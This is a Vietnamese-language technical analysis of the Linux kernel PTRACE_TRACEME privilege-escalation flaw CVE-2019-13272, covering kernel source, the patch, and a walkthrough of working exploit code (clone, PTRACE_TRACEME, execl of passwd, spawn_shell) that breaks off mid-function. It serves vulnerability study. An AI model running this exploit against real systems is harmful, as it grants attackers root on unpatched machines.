# CVE-2019-13272
PTRACE_TRACEME CVE-2019-13272 local privilege escalation vulnerability analysis
-

PTRACE_TRACEME là một lỗ hỏng leo thang đặc quyền trong Kernel Linux được phát hiện bởi Jann Horn vào tháng 7 năm 2019. 

## Phân tích lỗ hỏng:
Ptrace là một system call, nó cung cấp một phương thức để cho phép một process (tracer) có thể quan sát và điều khiển quá trình thực thi của một process khác (tracee), kiểm tra và thay đổi core image và thanh ghi của nó, chủ yếu được sử dụng để đặt break point trong debug và theo dõi quá trình gọi system call.

``` c
1    396  kernel/ptrace.c <<ptrace_attach>>
             ptrace_link(task, current);
2    469  kernel/ptrace.c <<ptrace_traceme>>
             ptrace_link(current, current->real_parent);
                           
```


Có hai cách để thiết lập một trace relationship:
  - Process sẽ gọi hàm fork và process con của nó sẽ gọi `PTRACE_TRACEME` (tương ứng hàm `ptrace_traceme` trong kernel) để khởi tạo tracee.
  - Process gọi `PTRACE_ATTACH` hoặc `PTRACE_SEIZE` (tương ứng hàm `ptrace_attach` trong kernel) để khởi tạo một tracer để trace process khác.
  
Dù sử dùng cách nào đi nữa thì hàm `ptrace_link` vẫn sẽ được gọi cuối cùng để thiết lập trace relationship giữa tracer và tracee
- Hai tham số truyền vào `ptrace_link` đối với `ptrace_attach` là 'task' (tracee) và 'current' (tracer)
- Hai tham số truyền vào `ptrace_link` đối với `ptrace_traceme` là 'current' (tracee) và 'current->real_parent' (tracer)

Ở đây, ta cần phải lưu ý hai tham số truyền vào của tracer và tracee là gì ở 2 cách trên khi gọi hàm `ptrace_link`, vì lổ hỏng sẽ nằm ở hàm `ptrace_link`

``` c
static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
{
        rcu_read_lock();
        __ptrace_link(child, new_parent, __task_cred(new_parent));
        rcu_read_unlock();
}

void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
                   const struct cred *ptracer_cred)
{
        BUG_ON(!list_empty(&child->ptrace_entry));
        list_add(&child->ptrace_entry, &new_parent->ptraced); // 1. thêm chính nó vào hàng đợi 
                                                                 // ptraced của process cha
        child->parent = new_parent; // 2. Lưu địa chỉ của process cha trong con trỏ parent
        child->ptracer_cred = get_cred(ptracer_cred); // 3. Lưu ptracer_cred lại, ta cần tập trung 
                                                          // vào biến này vì lỗi nằm ở đây
}
```

Mấu chốt để thiết lập trace relationship là tracee sẽ ghi lại cred của tracer và lưu nó trong biến '*ptracer_cred*' của tracee.

Khái niệm về '*ptracer_cred*' đã được giới thiệu bởi một bản vá vào năm 2016, [ptrace: Capture the ptracer's creds not PT_PTRACE_CAP](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67). Mục đích của việc giới thiệu '*ptracer_cred*' là để thực hiện kiểm tra bảo mật khi tracee thực thi exec để load [setuid executable](https://www.computerhope.com/jargon/s/setuid.htm)

Tại sao chúng ta cần kiểm tra sự an toàn này?

Family của [exec](http://man7.org/linux/man-pages/man3/exec.3.html) có thể cập nhật image của process. Nếu [setuid bit](https://en.wikipedia.org/wiki/Setuid) của file thực thi được set, khi file thực thi được chạy, [euid](https://en.wikipedia.org/wiki/User_identifier) của process sẽ được sửa đổi thành uid của chủ sở hữu file thực thi. Quyền của process cao hơn quyền của người dùng gọi exec và việc chạy loại [setuid executable](https://www.computerhope.com/jargon/s/setuid.htm) này sẽ có tác động leo thang ([escalation](https://www.computerhope.com/jargon/s/setuid.htm)).

Hãy tưởng tượng, nếu bản thân process thực thi exec là một tracee, sau khi nó thực hiện [setuid executable](https://www.computerhope.com/jargon/s/setuid.htm) để leo thang đặc quyền, tracer của nó có thể sửa đổi các thanh ghi và bộ nhớ của nó (tracee) bất kỳ lúc nào, và nếu tracer có đặc quyền thấp có thể kiểm soát tracee có đặc quyền cao, tracer có thể thực hiện các hoạt động trái phép thông qua tracee.

Tuy nhiên, trong kernel, dường như không cho phép tồn tại những hành vi vượt quá thẩm quyền như vậy, vì vậy khi thiết lập trace relationships, tracee cần lưu cred của tracer (tức là ptracer_cred), nếu tracee thực thi một exec process, nó sẽ kiểm tra xem setuid bit của file thực thi được chạy có được set hay không, nếu có, nó sẽ xem xét quyền của '*ptracer_cred*'. Nếu quyền không thỏa, quyền thực thi của setuid bit (đặc quyền của chủ sở hữu file) sẽ không được dùng để thực thi exec mà sẽ được thực thi với quyền của người dùng ban đầu.

Phân tích code của process này như sau (phân tích code của bài viết này dựa trên v4.19-rc8).
``` python
do_execve
  -> __do_execve_file
  -> prepare_binprm 
      -> bprm_fill_uid
      -> security_bprm_set_creds
          ->cap_bprm_set_creds
          -> ptracer_capable
          ->selinux_bprm_set_creds
          ->(apparmor_bprm_set_creds)
          ->(smack_bprm_set_creds)
          ->(tomoyo_bprm_set_creds)

```
Các hoạt động liên quan đến quyền thực thi chủ yếu nằm trong hàm `prepare_binprm`
``` c
1567 int prepare_binprm(struct linux_binprm *bprm)
1568 {
1569         int retval;
1570         loff_t pos = 0;
1571 
1572         bprm_fill_uid(bprm); // <-- fill cred của new process (xem hàm bprm_fill_uid bên dưới sẽ rõ hơn)
1573 
1574         /* fill in binprm security blob */
1575         retval = security_bprm_set_creds(bprm); // <-- kiểm tra bảo mật, để xem xét sửa đổi cred của new process     
1576         if (retval)
1577                 return retval;
1578         bprm->called_set_creds = 1;
1579 
1580         memset(bprm->buf, 0, BINPRM_BUF_SIZE);
1581         return kernel_read(bprm->file, bprm->buf, BINPRM_BUF_SIZE, &pos);
1582 }
```

Như ở trên, trước tiên gọi `bprm_fill_uid` để fill cred của new process, sau đó gọi `security_bprm_set_creds` để kiểm tra bảo mật và sửa đổi cred mới nếu cần.
``` c
1509 static void bprm_fill_uid(struct linux_binprm *bprm)
1510 {
1511         struct inode *inode;
1512         unsigned int mode;
1513         kuid_t uid;
1514         kgid_t gid;
1515 
1516         /*
1517          * Since this can be called multiple times (via prepare_binprm),
1518          * we must clear any previous work done when setting set[ug]id
1519          * bits from any earlier bprm->file uses (for example when run
1520          * first for a setuid script then again for its interpreter).
1521          */
1522         bprm->cred->euid = current_euid(); // <--- trước tiên sẽ sử dụng euid của process hiện tại
1523         bprm->cred->egid = current_egid();
1524 
1525         if (!mnt_may_suid(bprm->file->f_path.mnt))
1526                 return;
1527 
1528         if (task_no_new_privs(current))
1529                 return;
1530 
1531         inode = bprm->file->f_path.dentry->d_inode;
1532         mode = READ_ONCE(inode->i_mode);
1533         if (!(mode & (S_ISUID|S_ISGID))) // <---------- nếu bit setuid/setgid của file thực thi không được set
1534                 return;                  //              , hàm sẽ return tại đây.
1535 
1536         /* Be careful if suid/sgid is set */
1537         inode_lock(inode);
1538 
1539         /* reload atomically mode/uid/gid now that lock held */
1540         mode = inode->i_mode;
1541         uid = inode->i_uid; // <---- nếu S_ISUID được set，sử dụng i_uid của file
1542         gid = inode->i_gid;
1543         inode_unlock(inode);
1544 
1545         /* We ignore suid/sgid if there are no mappings for them in the ns */
1546         if (!kuid_has_mapping(bprm->cred->user_ns, uid) ||
1547                  !kgid_has_mapping(bprm->cred->user_ns, gid))
1548                 return;
1549 
1550         if (mode & S_ISUID) {
1551                 bprm->per_clear |= PER_CLEAR_ON_SETID;
1552                 bprm->cred->euid = uid; // <------ sử dụng uid của file như là euid của new process
1553         }
1554 
1555         if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) {
1556                 bprm->per_clear |= PER_CLEAR_ON_SETID;
1557                 bprm->cred->egid = gid;
1558         }
1559 }
```

Nhìn vào 2 dòng code sau đối với đoạn code ở trên:
- Dòng 1522, gán euid hiện tại của process vào new euid, vì vậy hầu hết các process thực thi đều thực thi dưới quyền ban đầu.
- Dòng 1552, nếu bit suid được set, gán uid của chủ sở hữu file thực thi vào new uid. Có thể hiểu nó giống như việc setuid. New euid trở thành uid của chủ sở hữu file thực thi, nếu chủ sở hữu là một user đặc quyền, leo thang đặc quyền sẽ diễn ra ở đây.

Tuy nhiên, euid ở đây vẫn chưa phải là kết quả cuối cùng, ta cần xem xẻt hàm `security_bprm_set_creds` để biết thêm về việc kiểm tra bảo mật.

Hàm `security_bprm_set_creds` gọi [LSM](https://en.wikipedia.org/wiki/Linux_Security_Modules) framework

Trên phiên bản kernel mà tôi phân tích, có đến 5 điểm hook lsm frameworks thực hiện kiểm tra bảo mật của 'bprm_set_creds'. Các hàm kiểm tra như sau:
``` python
cap_bprm_set_creds
selinux_bprm_set_creds
apparmor_bprm_set_creds
smack_bprm_set_creds
tomoyo_bprm_set_creds
```

Các hàm hook nào sẽ được thực thi ở đây sẽ liên quan đến cấu hình của từng kernel cụ thể. Về lý thuyết, nếu tất cả các lsm frameworks được enable, tất cả các hàm hook được đề cập ở trên sẽ được triển khai để kiểm tra 'bprm_set_creds'.

Trong môi trường phân tích của tôi chỉ có duy nhất các hàm hook `cap_bprm_set_creds` và `selinux_bprm_set_creds` được chạy.

Trong đó, hàm `cap_bprm_set_creds` sẽ đóng vai trò thay đổi euid:
``` c
815 int cap_bprm_set_creds(struct linux_binprm *bprm)
816 {
817         const struct cred *old = current_cred();
818         struct cred *new = bprm->cred;
819         bool effective = false, has_fcap = false, is_setid;
820         int ret;
821         kuid_t root_uid;
===================== skip ======================
838         /* Don't let someone trace a set[ug]id/setpcap binary with the revised
839          * credentials unless they have the appropriate permit.
840          *
841          * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.
842          */
843         is_setid = __is_setuid(new, old) || __is_setgid(new, old);  
844 
845         if ((is_setid || __cap_gained(permitted, new, old)) && // <---- kiểm tra setid của chương trình được thực thi
846             ((bprm->unsafe & ~LSM_UNSAFE_PTRACE) ||
847              !ptracer_capable(current, new->user_ns))) { // <----- Nếu process thực thi execve được trace, và executed program là setuid, quyền sẽ được xem xét thêm vào
848                 /* downgrade; they get no more than they had, and maybe less */
849                 if (!ns_capable(new->user_ns, CAP_SETUID) ||
850                     (bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS)) {
851                         new->euid = new->uid; // <----- Nếu không thỏa điều kiện, euid của tiến trình mới sẽ được reset về uid ban đầu
852                         new->egid = new->gid;
853                 }
854                 new->cap_permitted = cap_intersect(new->cap_permitted,
855                                                    old->cap_permitted);
856         }
857 
858         new->suid = new->fsuid = new->euid;
859         new->sgid = new->fsgid = new->egid;
===================== skip ======================
    }
```

Như ở trên, 
  - Dòng 845 kiểm tra xem liệu euid có nhất quán với uid gốc hay không (trong phân tích hàm `bprm_fill_uid` ở trên, nếu tệp được thực thi có setuid bit được set, euid thường sẽ không nhất quán) ==> Ở đây cũng có thể hiểu, nó tương đương với việc phát hiện process được thực thi có phải là chương trình setid hay không.
  - Dòng 847 sẽ kiểm tra xem process có phải là tracee hay không.
  
Nếu hai điều kiện trên được đáp ứng, hàm `ptracer_capable` cần được thực thi để kiểm tra quyền. Nếu kiểm tra không thỏa, việc hạ quyền sẽ được thực hiện.
  - Dòng 851, thay đổi giá trị của '*new->euid*' thành '*new->uid*', có nghĩa là quyền được lấy từ hàm `bprm_fill_uid` (cred) có thể bị hạ tại đây.
``` c
    499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)
    500 {
    501         int ret = 0;  /* An absent tracer adds no restrictions */
    502         const struct cred *cred;
    503         rcu_read_lock();
    504         cred = rcu_dereference(tsk->ptracer_cred); // <----- lấy ra ptracer_cred được lưu khi ptrace_link
    505         if (cred)
    506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE); // <-- đi vào lsm framwork để kiểm tra bảo mật
    507         rcu_read_unlock();
    508         return (ret == 0);
    509 }
    
```

Như ở trên
- Dòng 504 lấy ra '*tsk->ptracer_cred*'.
- Dòng 506, vào lsm framework để kiểm tra '*tsk->ptracer_cred*'.

Biến '*tsk->ptracer_cred*' liên quan đến lỗ hổng nằm tại đây. Như đã đề cập trước đó, biến này là cred của tracer được lưu bởi tracee khi trace relationship được thiết lập.

Khi tracee thực hiện execve sau đó để thực thi chương trình suid executable, nó sẽ gọi hàm `ptracer_capable` và sử dụng security framework trong lsm để xác định quyền của '*ptracer_cred*'.

Chúng ta sẽ không phân tích `security_capable_noaudit` trong lsm framework, nhưng có thể hiểu đơn giản rằng nếu bản thân tracer có đặc quyền root thì việc kiểm tra ở đây sẽ được pass, nếu không, nó sẽ trả về lỗi.

Theo phân tích trước đó, nếu kiểm tra bởi hàm `ptracer_capable` sai thì quyền của '*new->euid*' sẽ bị hạ về quyền ban đầu.

Ví dụ: A ptrace B, B thực thi `execve` '/usr/bin/passwd'. Theo phân tích của đoạn code trên, nếu A có quyền root thì euid của B thực thi passwd là root, ngược lại nó sẽ sử dụng quyền ban đầu.
``` c 
kernel/ptrace.c <<ptrace_traceme>>
             ptrace_link(current, current->real_parent);  

static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
{
        rcu_read_lock();
        __ptrace_link(child, new_parent, __task_cred(new_parent));
        rcu_read_unlock();
}
```

Quay lại đoạn code chứa lỗ hổng ở trên, tại sao traceme lại wrong khi ghi lại cred của cha nó khi thiết lập trace link? Rõ ràng lúc này cha của nó là tracer?

Bằng cách sử dụng ví dụ của Jann Horn để minh họa lý do tại sao traceme không thể sử dụng cred của tracer khi thiết lập trace link theo cách này.

``` py
 - 1,  task A: fork()s a child, task B
 - 2,  task B: fork()s a child, task C
 - 3,  task B: execve(/some/special/suid/binary)
 - 4,  task C: PTRACE_TRACEME (creates privileged ptrace relationship)
 - 5,  task C: execve(/usr/bin/passwd)
 - 6,  task B: drop privileges (setresuid(getuid(), getuid(), getuid()))
 - 7,  task B: become dumpable again (e.g. execve(/some/other/binary))
 - 8,  task A: PTRACE_ATTACH to task B
 - 9,  task A: use ptrace to take control of task B
 - 10, task B: use ptrace to take control of task C
```

Có tất cả 3 process: A, B, C trong kịch bản trên.
- Trong bước 4, khi task C sử dụng `PTRACE_TRACEME` để thiết lập trace link với B, vì euid của B bây giờ là 0 (vì nó vừa thực thi suid binary), euid của '*ptracer_cred*' được ghi bởi C cũng là 0
- Trong bước 5, task C thực thi `execve(suid binary)` sau đó. Theo phân tích ở trên, bởi vì '*ptracer_cred*' của C có đặc quyền, nên hàm `ptracer_capable` được pass, vì vậy sau khi thực hiện `execve`, euid của task C cũng được nâng lên thành 0. Lưu ý rằng trace link của B và C vẫn còn hiệu lực tại thời điểm này.
- Trong bước 6, Task B thực thi `setresuid` để hạ quyền của nó xuống. Mục đích của việc này là để tiến hành attach với task A
- Trong bước 8, Task A sử dụng `PTRACE_ATTACH` để thiết lập một trace link với B. Cả A và B đều có quyền thông thường, sau đó A có thể kiểm soát B để thực hiện bất cứ hoạt động nào.
- Trong bước 10, Task B kiểm soát task C để thực hiện hành động leo thang đặc quyền.

9 bước đầu tiên đều được thiết lập theo phân tích code trước đó, vậy bước thứ 9 có thể thiết lập được không?

Khi thực hiện bước 10, bản thân task B có đặc quyền thông thường, task C có đặc quyền root và trace link giữa B và C là hợp lệ. Trong điều kiện này, B có thể gửi một yêu cầu ptrace để C thực hiện các hoạt động khác nhau, bao gồm cả việc leo thang đặc quyền hay không?

Hãy phân tích điều này với code bên dưới:
``` c
1111 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
1112                 unsigned long, data)
1113 {
1114         struct task_struct *child;
1115         long ret;
1116 
1117         if (request == PTRACE_TRACEME) {
1118                 ret = ptrace_traceme(); // <----- đi vào nhánh traceme
1119                 if (!ret)
1120                         arch_ptrace_attach(current);
1121                 goto out;
1122         }
1123 
1124         child = find_get_task_by_vpid(pid);
1125         if (!child) {
1126                 ret = -ESRCH;
1127                 goto out;
1128         }
1129 
1130         if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {
1131                 ret = ptrace_attach(child, request, addr, data); // <------ đi vào nhánh attach
1132                 /*
1133                  * Some architectures need to do book-keeping after
1134                  * a ptrace attach.
1135                  */
1136                 if (!ret)
1137                         arch_ptrace_attach(child);
1138                 goto out_put_task_struct;
1139         }
1140 
1141         ret = ptrace_check_attach(child, request == PTRACE_KILL ||
1142                                   request == PTRACE_INTERRUPT);
1143         if (ret < 0)
1144                 goto out_put_task_struct;
1145 
1146         ret = arch_ptrace(child, request, addr, data); // <----  các yêu cầu ptrace khác
1147         if (ret || request != PTRACE_DETACH)
1148                 ptrace_unfreeze_traced(child);
1149 
1150  out_put_task_struct:
1151         put_task_struct(child);
1152  out:
1153         return ret;
1154 }
```

Như đoạn code ở trên, vì task B và task C đã có các trace links tại thời điểm này rồi, yêu cầu ptrace có thể được gửi trực tiếp đến C thông qua B, từ đó hàm `arch_ptrace` sẽ được gọi.

``` c
arch/x86/kernel/ptrace.c

arch_ptrace 
    -> ptrace_request 
        -> generic_ptrace_peekdata
           generic_ptrace_pokedata 
            -> ptrace_access_vm 
                -> ptracer_capable 
kernel/ptrace.c
884 int ptrace_request(struct task_struct *child, long request,
885                    unsigned long addr, unsigned long data)
886 {
887         bool seized = child->ptrace & PT_SEIZED;
888         int ret = -EIO;
889         siginfo_t siginfo, *si;
890         void __user *datavp = (void __user *) data;
891         unsigned long __user *datalp = datavp;
892         unsigned long flags;
893 
894         switch (request) {
895         case PTRACE_PEEKTEXT:
896         case PTRACE_PEEKDATA:
897                 return generic_ptrace_peekdata(child, addr, data);
898         case PTRACE_POKETEXT:
899         case PTRACE_POKEDATA:
900                 return generic_ptrace_pokedata(child, addr, data);
901 
=================== skip ================
1105 }



1156 int generic_ptrace_peekdata(struct task_struct *tsk, unsigned long addr,
1157                             unsigned long data)
1158 {
1159         unsigned long tmp;
1160         int copied;
1161 
1162         copied = ptrace_access_vm(tsk, addr, &tmp, sizeof(tmp), FOLL_FORCE); // <--- gọi hàm ptrace_access_vm
1163         if (copied != sizeof(tmp))
1164                 return -EIO;
1165         return put_user(tmp, (unsigned long __user *)data);
1166 }
1167 
1168 int generic_ptrace_pokedata(struct task_struct *tsk, unsigned long addr,
1169                             unsigned long data)
1170 {
1171         int copied;
1172 
1173         copied = ptrace_access_vm(tsk, addr, &data, sizeof(data), // <---- gọi hàm ptrace_access_vm
1174                         FOLL_FORCE | FOLL_WRITE);
1175         return (copied == sizeof(data)) ? 0 : -EIO;
1176 }
```
 
Khi tracer muốn điều khiển tracee thực thi new code logic, nó cần gửi yêu cầu đọc và ghi vào vùng code và vùng nhớ của tracee. Yêu cầu tương ứng là các hàm `PTRACE_PEEKTEXT/PTRACE_PEEKDATA/PTRACE_POKETEXT/PTRACE_POKEDATA`.

Các thao tác đọc và ghi này cuối cùng được thực hiện thông qua hàm `ptrace_access_vm`.
``` c
kernel/ptrace.c
38 int ptrace_access_vm(struct task_struct *tsk, unsigned long addr,
39                      void *buf, int len, unsigned int gup_flags)
40 {
41         struct mm_struct *mm;
42         int ret;
43 
44         mm = get_task_mm(tsk);
45         if (!mm)
46                 return 0;
47 
48         if (!tsk->ptrace ||
49             (current != tsk->parent) ||
50             ((get_dumpable(mm) != SUID_DUMP_USER) &&
51              !ptracer_capable(tsk, mm->user_ns))) { // < ----- gọi hàm ptracer_capable một lần nữa.
52                 mmput(mm);
53                 return 0;
54         }
55 
56         ret = __access_remote_vm(tsk, mm, addr, buf, len, gup_flags);
57         mmput(mm);
58 
59         return ret;
60 }

kernel/capability.c
499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)
500 {
501         int ret = 0;  /* An absent tracer adds no restrictions */
502         const struct cred *cred;
503         rcu_read_lock();
504         cred = rcu_dereference(tsk->ptracer_cred);
505         if (cred)
506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);
507         rcu_read_unlock();
508         return (ret == 0);
509 }
```

Nhìn vào đoạn code trên, ta có thể thấy, hàm `ptrace_access_vm` sẽ gọi hàm `ptracer_capable` mà chúng ta đã phân tích trước đó để xác định xem yêu cầu của nó có thể được thực hiện hay không.

Theo kết quả phân tích trước, '*ptracer_cred*' được lưu trong task C tại thời điểm này là một cred có đặc quyền, vì vậy `ptracer_capable` sẽ pass tại thời điểm này, có nghĩa là câu hỏi ở trên đã được trả lời. Trong trường hợp này, task B với quyền bình thường có thể dùng ptrace để gửi yêu cầu đọc và ghi vào vùng nhớ và vùng code của task C với quyền root.

Lúc này, đặc quyền '*ptracer_cred*' được thực hiện bởi task C trong hai trường hợp:
- Task C thực hiện `execve(suid binary)` để nâng cao quyền
- Task B với quyền thông thường có thể thực thi ptrace để đọc và ghi vào vùng code và vùng nhớ của task C, từ đó điều khiển task C thực hiện các hoạt động tùy ý

Sự kết hợp của 2 vai trò trên có phải là một hoạt động leo thang đặc quyền hoàn toàn hay không?

Trước khi trả lời cho câu hỏi bên trên, ta sẽ xem cách mà lổ hỏng này được khai thác và được vá.

# Sơ lược về bản vá lỗ hổng PTRACE_TRACEME
``` 
PTRACE_TRACEME records the parent's credentials as if the parent was 
acting as the subject, but that's not the case.  If a malicious
unprivileged child uses PTRACE_TRACEME and the parent is privileged, and
at a later point, the parent process becomes attacker-controlled
(because it drops privileges and calls execve()), the attacker ends up
with control over two processes with a privileged ptrace relationship,
which can be abused to ptrace a suid binary and obtain root privileges.
```

Về bản chất, lỗ hổng này hơi giống lỗ hổng loại TOCTOU. Việc lấy được '*ptracer_cred*' ở giai đoạn traceme và việc sử dụng '*ptracer_cred*' ở giai đoạn tiếp theo trong yêu cầu ptrace tiếp theo, cred của tracer có thể không phải là cred ban đầu mà là cred của thời điểm liên kết (nghĩa là nó được gán lại ở trong hàm `ptrace_link`).

``` diff
diff --git a/kernel/ptrace.c b/kernel/ptrace.c
index 8456b6e..705887f 100644
--- a/kernel/ptrace.c
+++ b/kernel/ptrace.c
@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
  */
 static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
 {
-    rcu_read_lock();
-    __ptrace_link(child, new_parent, __task_cred(new_parent));
-    rcu_read_unlock();
+    __ptrace_link(child, new_parent, current_cred());
 }
```

Hãy cùng nhìn lại bản vá: '*\_\_task_cred(new_parent)*' thay bằng '*current_cred()*'

Bản vá chỉ ra rằng khi PTRACE_TRACEME được thực thi, '*ptracer_cred*' không được sử dụng cred của process cha, mà sử dụng cred của chính nó.

# Exploit
Mấu chốt để khai thác lỗ hổng này là tìm một chương trình thực thi phù hợp để bắt đầu task B. Chương trình thực thi này phải đáp ứng các điều kiện sau
- Người dùng bình thường có thể gọi được
- Phải có một giai đoạn leo thang đặc quyền lên root trong quá trình thực thi
- Sau khi có quyền root, phải có thể hạ quyền xuống.

(Mục đích của việc tạm thời leo lên root là để cho phép task C có được ptracer_cred của root và mục đích của việc hạ cấp quyền là để cho phép B được attach bởi một process với các đặc quyền ptrace thông thường ))

Ở đây là 3 mẫu code để khai thác:
- [Exploit by Jann Horn](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217)
- [Exploit by Bcoles](https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c)
- [Exploit by Jiayy](https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272)

Trong [exploit của Jann Horn](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217), chương trình [pkexec](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html) sẵn có trong máy (đối với bản desktop) được sử dụng để bắt đầu task B

[pkexec](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html) cho phép người dùng có đặc quyền chạy một chương trình khác với quyền người dùng khác, được sử dụng trong framework xác thực của polkit. Khi sử dụng tham số --user, nó cho phép process nâng cấp quyền lên root và sau đó hạ xuống người dùng được chỉ định, vì vậy nó có thể được sử dụng cho quá trình xây dựng task B, ngoài ra, ta cần tìm thêm các chương trình thực thi được thực thi thông qua khung polkit (Jann Horn sử dụng các helper). Các chương trình này cần phải đáp ứng rằng người dùng bình thường có thể thực thi chúng bằng pkexec mà không cần phải xác thực (nhiều chương trình được thực thi thông qua polkit yêu cầu xác thực thông qua cửa sổ đưuọc bật lên), cách để thực thi như sau:
``` sh
/usr/bin/pkexec —user nonrootuser /user/sbin/some-helper-binary
```

[Exploit](https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c) của Bcoles thêm code để tìm thêm helper binary trên cơ sở của Jann Horn. Bởi vì helper của Jann Horn là một hard-coded program, nó không tồn tại trong nhiều bản phân phối linux, vì vậy exploit của anh ấy không thể được sử dụng trên nhiều hệ thống phân phối. Ngược lại, exploit code của bcoles có thể chạy thành công trên nhiều bản phân phối hơn.

Để phục vụ mục đích nghiên cứu, tôi sẽ nói về [exploit của Jiayy](https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272), bởi vì helper binary của các bản phân phối khác nhau sẽ khác nhau và pkexec chỉ có trên bản phân phối desktop và trên thực tế, lỗ hỏng leo thang đặc quyền này là một lỗ hỏng của Linux kernel, vì vậy, exploit của Jann Horn được thay đổi để sử dụng để leo thang đặc quyền thông qua 2 chương trình fakepkexec và fakehelper được tạo thủ công (thay vì tìm kiếm từ target system), để người đọc có thể chạy exploit này trên bất kỳ hệ thống Linux nào có lỗ hổng này (kể cả không phải desktop) để phục vụ cho việc nghiên cứu.

## exploit analysis
Hãy xem exploit code bên dưới:
``` c
167 int main(int argc, char **argv) {
168   if (strcmp(argv[0], "stage2") == 0)
169     return middle_stage2();
170   if (strcmp(argv[0], "stage3") == 0)
171     return spawn_shell();
172 
173   helper_path = "/tmp/fakehelper";
174 
175   /*
176    * set up a pipe such that the next write to it will block: packet mode,
177    * limited to one packet
178    */
179   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
180   SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
181   char dummy = 0;
182   SAFE(write(block_pipe[1], &dummy, 1));
183 
184   /* spawn pkexec in a child, and continue here once our child is in execve() */
185   static char middle_stack[1024*1024];
186   pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
187                             CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
188   if (!middle_success) return 1;
189 
======================= skip =======================
215 }
```

Đầu tiền, hãy nhìn vào dòng 186, lệnh gọi hàm clone để tạo một tiến trình con (task B), task B sẽ chạy hàm middle_main.
``` c
64 static int middle_main(void *dummy) {
65   prctl(PR_SET_PDEATHSIG, SIGKILL);
66   pid_t middle = getpid();
67 
68   self_fd = SAFE(open("/proc/self/exe", O_RDONLY));
69 
70   pid_t child = SAFE(fork());
71   if (child == 0) {
72     prctl(PR_SET_PDEATHSIG, SIGKILL);
73 
74     SAFE(dup2(self_fd, 42));
75 
76     /* spin until our parent becomes privileged (have to be fast here) */
77     int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
78     char *needle = tprintf("nUid:t%dt0t", getuid());
79     while (1) {
80       char buf[1000];
81       ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
82       buf[buflen] = '';
83       if (strstr(buf, needle)) break;
84     }
85 
86     /*
87      * this is where the bug is triggered.
88      * while our parent is in the middle of pkexec, we force it to become our
89      * tracer, with pkexec's creds as ptracer_cred.
90      */
91     SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));
92 
93     /*
94      * now we execute passwd. because the ptrace relationship is considered to
95      * be privileged, this is a proper suid execution despite the attached
96      * tracer, not a degraded one.
97      * at the end of execve(), this process receives a SIGTRAP from ptrace.
98      */
99     puts("executing passwd");
100     execl("/usr/bin/passwd", "passwd", NULL);
101     err(1, "execl passwd");
102   }
103 
104   SAFE(dup2(self_fd, 0));
105   SAFE(dup2(block_pipe[1], 1));
106 
107   struct passwd *pw = getpwuid(getuid());
108   if (pw == NULL) err(1, "getpwuid");
109 
110   middle_success = 1;
111   execl("/tmp/fakepkexec", "fakepkexec", "--user", pw->pw_name, NULL);
112   middle_success = 0;
113   err(1, "execl pkexec");
114 }
```

Dòng 70, gọi hàm fork để tạo một grandchild process (task C).

Sau đó, tại dòng 111, task B chạy fakepkexec để nâng quyền và sau đó hạ quyền.

Tiếp theo, nhìn vào dòng 76 đến 84, sau khi task C phát hiện ra rằng euid của task B trở thành 0, nó sẽ thực thi dòng 91 để thực hiện thao tác PTRACE_TRACEME để lấy ptracer_cred của root, và sau đó ngay lập tức chạy executel để thực thi suid binary để làm cho euid của nó trở thành 0

``` c
190   /*
191    * wait for our child to go through both execve() calls (first pkexec, then
192    * the executable permitted by polkit policy).
193    */
194   while (1) {
195     int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
196     char buf[16];
197     int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
198     buf[buflen] = '';
199     *strchrnul(buf, 'n') = '';
200     if (strncmp(buf, basename(helper_path), 15) == 0)
201       break;
202     usleep(100000);
203   }
204 
205   /*
206    * our child should have gone through both the privileged execve() and the
207    * following execve() here
208    */
209   SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
210   SAFE(waitpid(midpid, &dummy_status, 0));
211   fputs("attached to midpidn", stderr);
212 
213   force_exec_and_wait(midpid, 0, "stage2");
214   return 0;
```

Tiếp theo, quay lại hàm main của task A, dòng từ 194 đến 202, task A kiểm tra file comm của task B đã trở thành helper chưa, nếu rồi, nó sẽ chạy dòng 213 để thực thi hàm force_exec_and_wait
``` c
116 static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
117   struct user_regs_struct regs;
118   struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
119   SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
120   SAFE(waitpid(pid, &dummy_status, 0));
121   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
122 
123   /* set up indirect arguments */
124   unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
125   struct injected_page {
